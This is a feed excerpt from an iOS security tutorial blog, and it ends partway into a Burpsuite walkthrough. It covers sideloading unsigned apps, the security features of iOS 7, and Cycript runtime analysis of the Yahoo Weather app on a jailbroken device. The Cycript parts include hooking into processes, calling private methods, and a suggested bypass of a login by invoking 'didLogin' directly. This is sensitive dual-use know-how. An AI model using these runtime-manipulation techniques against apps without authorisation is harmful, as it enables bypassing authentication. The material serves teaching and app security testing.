&lt;p&gt;After you have selected the device, click on Run and you will get a warning as shown in the image below. Click on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Always Allow&lt;/code&gt;.You might get an error on the device or in Xcode but the app will be installed on the device. So just disconnect your device from your computer, quit the current instance of the app and run it again. It will now run the app without any troubles.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios7/16.png&quot; alt=&quot;16&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There are some other ways to run the app on the device as well. Just build the app and that will create a .app file inside a particular directory in Xcode. The default location for that build is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Users/$[YOUR_USER_NAME]/Library/Developer/Xcode/DerivedData/$[YOUR_APP_NAME_APP_ID]/Build/Products/Debug-iphoneos/&lt;/code&gt;. In my case, the location is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Users/prateekgianchandani/Library/Developer/Xcode/DerivedData/SelfSignedApp-bfzixtyoynrxxlgigskifizrfqqw/Build/Products/Debug-iphoneos/&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Let’s copy the .app file to Desktop using the following command.&lt;/p&gt;

&lt;p&gt;mv /Users/$[YOUR_USER_NAME]/Library/Developer/Xcode/DerivedData/$[YOUR_APP_NAME_APP_ID]/Build/Products/Debug-iphoneos/SelfSignedApp.app /Users/$[YOUR_USER_NAME]/Desktop/&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios7/17.png&quot; alt=&quot;17&quot; /&gt; &lt;img src=&quot;/images/posts/ios7/18.png&quot; alt=&quot;18&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now create a folder named Payload, put the SelfSigned.app file under it, compress that folder (it will be initially named as Payload.zip) and name it SelfSigned.ipa .As we saw in part 2 of this series, this is the bundle in which iOS applications are stored.&lt;/p&gt;

&lt;p&gt;Once we have the ipa file, there are 2 ways to install it. One is to just drag and drop this ipa file into the apps section in iTunes, then use iTunes to install the app on the device.&lt;/p&gt;

&lt;p&gt;Another technique is to upload this ipa file to the device using sftp and then use a utility called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;installipa&lt;/code&gt; to install it on your device.&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Installipa&lt;/code&gt; can be downloaded directly onto your device using Cydia.&lt;/p&gt;

&lt;p&gt;Upload the ipa file to your device using sftp.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios7/19.png&quot; alt=&quot;19&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then ssh into your device and install the app using the command line utility &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;installipa&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios7/20.png&quot; alt=&quot;20&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This will install the application on your device. You might have to restart or respring the device for the app to function properly.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;In this article, we looked at how we can install custom applications on the device without a valid developer certificate. In the next article, we will be using these techniques to install our own applications on the device and then perform various tests on them.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 6 - New Security Features in iOS 7</title>
   <link href="https://bitbrain.github.io/2013/07/25/ios-application-security-part-6-new-security-features-in-ios-7.html"/>
   <updated>2013-07-25T15:07:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/07/25/ios-application-security-part-6-new-security-features-in-ios-7</id>
   <content type="html">&lt;p&gt;As we all know, Apple recently introducted its new version of iOS at WWDC 2013 with a completely redesinged User Interface. If you haven’t seen it yet, check out this video from WWDC 2013.&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;http://www.youtube.com/embed/zcebqUdvDrw&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;This article will be a small deviation from the other parts in this series. In this articles, we will discuss about the latest security features introduced in iOS 7.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h2 id=&quot;getting-ios-7&quot;&gt;Getting iOS 7.&lt;/h2&gt;

&lt;p&gt;To get iOS 7 beta, you have to be a registered apple developer. Go to http://developer.apple.com , log in with your registered Apple ID, and go to &lt;a href=&quot;https://developer.apple.com/devcenter/ios/index.action#betadownloads&quot;&gt;this&lt;/a&gt; url. Then click on the iOS 7 SDK tab on the top and click on Downloads. You can then download the latest build of iOS 7 beta.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios6/Screen Shot 2013-06-25 at 5.35.32 AM.png&quot; alt=&quot;Screen Shot 2013 06 25 At 5.35.32 AM&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here are some of the new security features introduced with iOS 7.&lt;/p&gt;

&lt;h2 id=&quot;activation-lock&quot;&gt;Activation Lock&lt;/h2&gt;

&lt;p&gt;Previously, if some user had lost their iPhone, they could use the “Find my Iphone” app to track down their phone using GPS. But there was one very big flaw with this whole process. Even a not so aware thief could perfom a factory reset of the device and that would just erase all contents and settings on he device. However, now with the activation lock feature, the thief would need to know the password for the Apple Id of the user in order to perform a factory reset.&lt;/p&gt;

&lt;p&gt;To Check this feature Go To &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Settings&lt;/code&gt;, then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;General&lt;/code&gt;, then scroll to the bottom and you will see a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Reset&lt;/code&gt; button.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios6/photo 1.PNG&quot; alt=&quot;Photo 1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If you tap on this button and then tap on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Erase All Contents and Settings&lt;/code&gt;, you will see a popup which asks for your Apple Id password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios6/photo 2.PNG&quot; alt=&quot;Photo 2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is a very handy feature and prevents the thief from resetting your iPhone’s settings and data. But we can be sure that’s its just a matter of time before someone finds a workaround for it after this is released to the public. You will get the same popup when you to go your iCloud Settings and try to turn off &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Find My iPhone&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios6/photo 3.PNG&quot; alt=&quot;Photo 3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, we get an alert asking for the Apple Id password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios6/photo 4.PNG&quot; alt=&quot;Photo 4&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;encrypted-data-transfer-with-airdrop&quot;&gt;Encrypted data transfer with Airdrop&lt;/h2&gt;

&lt;p&gt;Airdrop lets you share files with anyone around you with just a tap. Airdrop was introduced for iOS with iOS 7. The good thing about this is that the files are encrypted. By default, this service only lets you be visible to only your contacts. But you can change this setting as well.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios6/photo0.PNG&quot; alt=&quot;Photo0&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;third-party-app-data-protection&quot;&gt;Third-party app data protection.&lt;/h2&gt;

&lt;p&gt;Data protection is a feature for those devices that support hardware encryption, which means it supports devices from Iphone 3Gs and so on. According to &lt;a href=&quot;http://support.apple.com/kb/ht4175&quot;&gt;Apple&lt;/a&gt;…&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Data protection enhances the built-in hardware encryption by protecting the hardware encryption keys with your passcode. This provides an additional layer of protection for your email messages and attachments. Third-party applications can use the data protection APIs in iOS 4 and later to further protect application data.&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Uptil iOS 6, if you go to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Settings -&amp;gt; General -&amp;gt; Passcode&lt;/code&gt; and choose a passcode, you will see at the bottom that there is a text saying &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Data Protection is Enabled&lt;/code&gt;. This meant that data protection was enabled for the default Apple apps that come with iOS 6.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios6/photo.PNG&quot; alt=&quot;Photo&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Previously, the developers had to use the Data protection API to make the data in their apps secure. Now, with iOS 7, all the third-party apps have data protection enabled automatically, which means that the information contained within them is secure until the user unlocks the device. As we know, by default, Apple allows for a 4 digit passcode that can easily be bruteforced. Hence it is advisable to use better passcodes for enhanced security.&lt;/p&gt;

&lt;h2 id=&quot;security-improvements-in-game-center&quot;&gt;Security Improvements in Game Center&lt;/h2&gt;

&lt;p&gt;If you play games regularly on iOS and regularly use Game Center to challenge friends for a game or just check out some scores, you might have noticed some exceptionally high scores for some particular games. Usually, these are not legitimate scores but are scores that have been tampered with.Hackers exploit vulnerabilities in the api or sometimes modify variables in the app during runtime to create such high scores. With iOS 7, Apple has now allowed developers to make sure such tampering with the scores doesn’t happen. Now, developers can set a maximum score for every game. This way, the people with unusually high scores will not show up in the leaderboard but will still be saved on the server. The developers can later allow these unusually high scores to show up if they want. Apple has also added some tools for developers to spy on any suspicious activity by a user, and in such a case, block that user. Apple is also integrating signed submissions into Game Center which means that Apple can reject scores that it believes have been tampered with. It isn’t sure how they do it though.&lt;/p&gt;

&lt;h2 id=&quot;icloud-keychain&quot;&gt;iCloud Keychain&lt;/h2&gt;

&lt;p&gt;Most of us might have used the Safari AutoFill feature. With iOS 7, Safari now remembers much more information like username, password, credit card numbers etc and saves it in the keychain. It then automatically fills that info whenever a user visits a website. All this information is encrypted using 256-bit AES encryption. This keychain can also be synced via iCloud. Also, creating a new password for every new site that you sign in for may be a bit irritating and also tough to remember. Safari comes with a built in password generator that creates a unique password for every site that you sign in and then remembers it so you don’t have to remember it yourself.&lt;/p&gt;

&lt;h2 id=&quot;per-app-vpn&quot;&gt;Per App VPN&lt;/h2&gt;

&lt;p&gt;Sometimes, users want to access confidential information over a secure channel, and hence they use a VPN. With iOS 7, Apple allows users to use different VPN’s for every app. This is really useful when you want to access your office related information through a VPN provided by your office but for other apps, you are better off using another VPN. This feature will also be useful for government employees who want to acccess confidential data through their mobile apps.&lt;/p&gt;

&lt;p&gt;If you are an iOS developer and want to learn about the new things introduced with iOS 7, you can check out the WWDC 2013 videos here https://developer.apple.com/wwdc/videos/&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Apple sticks it to cheaters with Game Center on iOS 7&lt;br /&gt;
&lt;a href=&quot;http://www.idownloadblog.com/2013/06/15/ios7-game-center-dev-tools/&quot;&gt;http://www.idownloadblog.com/2013/06/15/ios7-game-center-dev-tools/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application security Part 5 – Advanced Runtime analysis and manipulation using Cycript (Yahoo Weather App)</title>
   <link href="https://bitbrain.github.io/2013/07/02/ios-application-security-part-5-advanced-runtime-analysis-and-manipulation-using-cycript-yahoo-weather-app.html"/>
   <updated>2013-07-02T17:26:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/07/02/ios-application-security-part-5-advanced-runtime-analysis-and-manipulation-using-cycript-yahoo-weather-app</id>
   <content type="html">&lt;p&gt;In the previous article, we learnt how to setup Cycript on your idevice, hook into a running process and obtain information about its properties in runtime. In this article, we will look at some advanced runtime analysis techniques. We will look at how we can obtain information about a particular class (methods, instance variables) and modify them at runtime.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h2 id=&quot;finding-methods-for-a-particular-class&quot;&gt;Finding methods for a particular class&lt;/h2&gt;

&lt;p&gt;Let’s say we are analyzing the flow of an app during its runtime. It would be really good to know what are the methods being called in a particular view controller or in a particular class. Since Cycript is a blend of Objective-C and Javascript, we can write a function that has both Objective-C and Javscript syntax. We can define functions in the interpreter and use them anytime we want to find out some particular information. A good source for finding such code snippets is available &lt;a href=&quot;http://iphonedevwiki.net/index.php/Cycript_Tricks&quot;&gt;here&lt;/a&gt; and we will be using most of the code snippets from here for this article.&lt;/p&gt;

&lt;p&gt;First of all, lets make sure we are hooked into the running process.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios5/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s define a method that prints out the methods for a particular class. You can find the code snippet on the Cycript tricks page &lt;a href=&quot;http://iphonedevwiki.net/index.php/Cycript_Tricks&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios5/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now that we have the method defined, we can input any class here and get the corresponding methods for it. From the previous article, we found out that the delegate class for this app was YWAppDelegate. Hence, let’s try and see all the methods contained in this class.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios5/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This gives us all the methods defined in the class YWAppDelegate. Everything after the @selector is the name of the method. Note that this will also give us information about the private methods. Also, this will also include the getters and setters for the properties defined in the class.&lt;/p&gt;

&lt;p&gt;Similarly, we can also print out the methods of YahooSlidingViewController.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios5/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We know that YahooSlidingViewController manages the sliding meny and works as a facade over the other view controllers. In order to find out the view controller that is actually responsible for displaying weather in the app, we can use the following command.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios5/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hence, the YWMainViewController is the view controller responsible for displaying the weather in the app. So the view shown in the screenshot below is actually the one coming from YWMainViewController.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios5/IMG_0094.PNG&quot; alt=&quot;IMG 0094&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s print out the methods for YWMainViewController.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios5/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, there is a method named userDidRequestUpdate.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios5/9y.png&quot; alt=&quot;9y&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From the method name, its obvious that this method gets called whenever the user pulls down on the app to refresh. With Cycript, we can call this method anytime we want. We will have to reference this view controller and then call this method on it. Here is how it’s done.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios5/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And if you see in the app, the update method gets called even though we didn’t actually pull down.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios5/IMG_0097.PNG&quot; alt=&quot;IMG 0097&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As told before in this article, these methods also contain the getters and setters of the properties.&lt;/p&gt;

&lt;p&gt;From a security point of view, such power to manipulate the runtime of an application gives us a lot of advantages.We can call any method whenever we want in the app. Imagine a flow in the app where the user first logs in the app by entering the username/password and then once he is logged in, a method named &lt;em&gt;didLogin&lt;/em&gt; gets called. In our case, we can just call this method ourselves without having to enter any username/password combination.&lt;/p&gt;

&lt;p&gt;It would be a bit helpful if we could print out all the variables used in a particular view controller. So lets define a function that prints out all the instance variables. You can find the code snippets &lt;a href=&quot;http://iphonedevwiki.net/index.php/Cycript_Tricks&quot;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios5/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, lets print out the instance variables for YWMainViewController.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios5/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, there is an instance variable named location view controllers. In the Yahoo weather app, you can swipe left and right to see the weather for different locations. From its name, it looks like the variable locationViewControllers is an array of view controllers which is responsible for holding a list of location view controllers. Using Cycript, we can also print out the value of this instance variable.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios5/9x.png&quot; alt=&quot;9x&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now let me swipe right to another location New york.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios5/IMG_0098.PNG&quot; alt=&quot;IMG 0098&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s print the value of this variable now.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios5/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, this array always has 3 location view controllers inside it and the others are null. It doesn’t contain all the reference of location view controllers so as to manage memory better. So at a particular time, we can have the view controller that we are looking at, and the left and right view controllers being instantiated. When we move to a different location, it automatically adjusts to make the visible view controller instance the one in the center and instantiates the left and right view controllers so the user can swipe left and right and won’t face any delay. This is one example of writing code that doesn’t take up much memory.&lt;/p&gt;

&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;

&lt;p&gt;In the previous two articles, we have performed the runtime analysis of the Yahoo weather app. In the next article, we will be looking at some more Cycript tricks and will focus specially on a technique known as method swizzling.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Cycript&lt;br /&gt;
&lt;a href=&quot;http://www.cycript.org/&quot;&gt;http://www.cycript.org/&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Cycript tricks&lt;br /&gt;
&lt;a href=&quot;http://iphonedevwiki.net/index.php/Cycript_Tricks&quot;&gt;http://iphonedevwiki.net/index.php/Cycript_Tricks&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This article was originally published on the &lt;a href=&quot;http://resources.infosecinstitute.com/&quot;&gt;resources&lt;/a&gt; page at &lt;a href=&quot;http://infosecinstitute.com/&quot;&gt;Infosec Institute&lt;/a&gt;. For more information, please visit my author &lt;a href=&quot;http://resources.infosecinstitute.com/author/prateek/&quot;&gt;page&lt;/a&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Appllication Security Part 4 – Runtime Analysis Using Cycript (Yahoo Weather App)</title>
   <link href="https://bitbrain.github.io/2013/07/02/ios-aios-appllication-security-part-4-runtime-analysis-using-cycript-yahoo-weather-app.html"/>
   <updated>2013-07-02T17:20:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/07/02/ios-aios-appllication-security-part-4-runtime-analysis-using-cycript-yahoo-weather-app</id>
   <content type="html">&lt;p&gt;In the previous article, we learnt about the runtime capabilities of an iOS App written in Objective-C which uses the Cocoa framework. In this article, we will look at how we can use a very essential tool named Cycript to analyze and modify the runtime of an iOS application. In this article, we will be performing our analysis on the Yahoo Weather iOS app.&lt;/p&gt;

&lt;h2 id=&quot;cycript&quot;&gt;Cycript&lt;/h2&gt;

&lt;p&gt;Cycript is a javascript interpreter which also understands Objective-C syntax, meaning we can write either Objective-C or javascript or even both in a particular command. It can also hook into a running process and help us to modify a lot of the things in the application during runtime. As far as its application to iOS application is concerned, here are some of the advantages of using Cycript.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;ol&gt;
  &lt;li&gt;We can hook into a running process and find the names of all classes being used, i.e the view controllers, the internal and third party libraries being used and even the name of the Application delegate.&lt;/li&gt;
  &lt;li&gt;For a particular class, i.e View Controller, App delegate or any other class, we can also find the names of all the methods being used.&lt;/li&gt;
  &lt;li&gt;We can also find the names of all the instance variable and their values at any particular time during the runtime of an application.&lt;/li&gt;
  &lt;li&gt;We can modify the values of the instance variable during runtime.&lt;/li&gt;
  &lt;li&gt;We can perform Method Swizzling, i.e replace the code of a particular method with some other implementation.&lt;/li&gt;
  &lt;li&gt;We can call any method in the application during runtime without it being in the actual code of the application .&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;installing-cycript&quot;&gt;Installing Cycript&lt;/h2&gt;

&lt;p&gt;To install Cycript on your device, you must download the latest version from their official download &lt;a href=&quot;http://www.cycript.org/debs/&quot;&gt;page&lt;/a&gt;. Make sure to download the latest version.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios4/1.png&quot; alt=&quot;1&quot; /&gt;Once they have been downloaded on your system, upload them to your device using sftp.&lt;img src=&quot;/images/posts/ios4/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then use the dpkg command to install cycript on your device.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios4/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then use the cycript command to check and see if everything is working.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios4/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;runtime-modification-with-cycript&quot;&gt;Runtime modification with Cycript&lt;/h2&gt;

&lt;p&gt;In this article, we will be performing all our tests on the &lt;em&gt;Yahoo Weather&lt;/em&gt; app. It’s a very neat app with an elegant UI that provides information about the weather of different places.&lt;/p&gt;

&lt;p&gt;Once the &lt;em&gt;Yahoo Weather&lt;/em&gt; has been installed, run it and make sure the app is the foreground. This is because once the app is in the background , it is in the paused state and you can’t do much with it. Once the app is run, you can directly hook into the running process by finding the PID of the weather app and then using the _cycript -p _command to hook into the process.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios4/5x.png&quot; alt=&quot;5x&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If the hooking is successful, you will be provided with a Cycript interpreter. Now we are all set.&lt;/p&gt;

&lt;p&gt;You can get the instance of the application by using the Objective-C syntax &lt;em&gt;[UIApplication sharedApplication]&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios4/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can also define variables using the Cycript interpreter as shown in the figure below. In this case, i am defining a variable &lt;em&gt;a&lt;/em&gt; for &lt;em&gt;[UIApplication sharedApplication]&lt;/em&gt;. Note that the L.H.S of this command is Javascript whereas the R.H.S is Objective-C syntax. This is the beauty of Cycript.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios4/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Cycript, by default has this variable which makes it easy to refer to the application instance.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios4/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To find the delegate class of this application, we can use the command &lt;em&gt;[UIApplication sharedApplication].delegate&lt;/em&gt;. But since we already defined a variable &lt;em&gt;a&lt;/em&gt; as the application instance, we can use the following command as shown in the figure below. &lt;img src=&quot;/images/posts/ios4/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hence, we now now that the delegate class name is &lt;em&gt;YWAppDelegate&lt;/em&gt;. So the delegate files are defined as YWAppDelegate.h and YWAppDelegate.m.&lt;/p&gt;

&lt;p&gt;Now, let’s try and call some methods in the app while it is running. A quick look at the application gives this kind of a picture.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios4/IMG_0091.PNG&quot; alt=&quot;IMG 0091&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, the status bar of the app is hidden. We can call a method in the application to unhide the status bar. Also, please make sure always that the app is in the foreground while you are performing runtime analysis on the application.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios4/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And here is how the app looks now&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios4/IMG_0092.PNG&quot; alt=&quot;IMG 0092&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, the status bar is now visible. Let’s try and see if we can modify the badge count of this particular application. A badge count is the number shown on the top-right of an application icon image. It usually refers to the amount of push notification received for the application. In mail apps, it can also refer to the amount of unread mails. In Yahoo Weather app, there is no concept of push notifications and hence there is no count shown on the top-right of its app icon. The thing is that the application badge number can be set locally in the app through a simple function call as well as remotely through a push notification from the server. Let’s try and see if we can set the badge count for the app. Here is the Objective-C method that we can need to call. In this case i am setting the badge count to 999&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios4/9x.png&quot; alt=&quot;9x&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And now if we go back to the home screen, we see the badge count in the app.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios4/IMG_0093.PNG&quot; alt=&quot;IMG 0093&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Perfect !!&lt;/p&gt;

&lt;p&gt;Let’s now investigate more and see what more we can find out about the app. In order to find out the current view controller of the app, we must first find out the keyWindow property. A keyWindow is the window which is currently accepting user interaction (touch events) from the user. If you want to find out all the windows in an app, here is how you do it. Note that a window is of the class type UIWindow.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios4/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, in order to find out the keyWindow at a particular time in the app, here is how you do it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios4/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, the root view controller for this window is found out by using the rootViewController property of the keyWindow. The root view controller property for this window is responsible for displaying the content in the window.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios4/14.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, the name of the rootViewController class is YahooSlidingViewController. From the name, it is pretty clear that this class is the slider used in the app as shown in the figure below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios4/IMG_0095.PNG&quot; alt=&quot;IMG 0095&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hence, this class basically acts as a facade over all the other view controllers. This means that whenever a menu item is chosen in the menu as shown in the figure above, the YahooSlidingViewController is the class responsible for displaying the appropriate view controller.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;In this article, we looked at how we can install Cycript into a jailbroken device, hook into a running process and find out the information about the properties of the application. We also looked at how we can call functions ourselves which are executed inside the sandbox of the application. In the next article, we will look at how we can find out all the methods of a given class and modify its implementation. We will also look at how we can modify the values of instance variables of a particular class.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Cycript&lt;br /&gt;
&lt;a href=&quot;http://www.cycript.org/&quot;&gt;http://www.cycript.org/&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Cycript tricks&lt;br /&gt;
&lt;a href=&quot;http://iphonedevwiki.net/index.php/Cycript_Tricks&quot;&gt;http://iphonedevwiki.net/index.php/Cycript_Tricks&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This article was originally published on the &lt;a href=&quot;http://resources.infosecinstitute.com/&quot;&gt;resources&lt;/a&gt; page at &lt;a href=&quot;http://infosecinstitute.com/&quot;&gt;Infosec Institute&lt;/a&gt;. For more information, please visit my author &lt;a href=&quot;http://resources.infosecinstitute.com/author/prateek/&quot;&gt;page&lt;/a&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Burpsuite Walkthrough</title>
   <link href="https://bitbrain.github.io/2013/06/19/burpsuite-walkthrough.html"/>
   <updated>2013-06-19T05:07:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/06/19/burpsuite-walkthrough</id>
   <content type="html">&lt;p&gt;Burpsuite is one of the best tools available for web application testing. Its wide variety of features helps us perform various tasks, from intercepting a request and modifying it on the fly, to scanning a web application for vulnerabilities, to brute forcing login forms, to perfoming a check for the randomness of session tokens and many other functions. In this article we will be doing a complete walkthrough of Burpsuite discussing all its major features.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;Burpsuite (free edition) is available by default in Backtrack 5. The professional edition can be downloaded from &lt;a href=&quot;http://portswigger.net/burp/download.html&quot;&gt;here&lt;/a&gt;. Some of the features that are not available in the free edition are Burp Scanner, Task Scheduler, Target Analyzer etc. Overall it has the following features.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1) Proxy&lt;/strong&gt; - Burpsuite comes with a proxy, which runs on port 8080 by default. Using this proxy, we can intercept and modify the traffic as it flows from the client system to the web application. In order to use this proxy, we have to configure our browser to use this proxy. We can also drop the packets if we want so that they do not reach their intended destination, redirect the traffic to a particular host etc.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2) Spider&lt;/strong&gt; - The spider feature of Burpsuite is used to crawl web applications looking for new links, content etc. It automatically submits login forms (through user defined input) in case it finds any, and looks for new content from the responses. This information can then be sent to the Burp Scanner to perform a detailed scan on all the links and content provided by the spider.&lt;/p&gt;

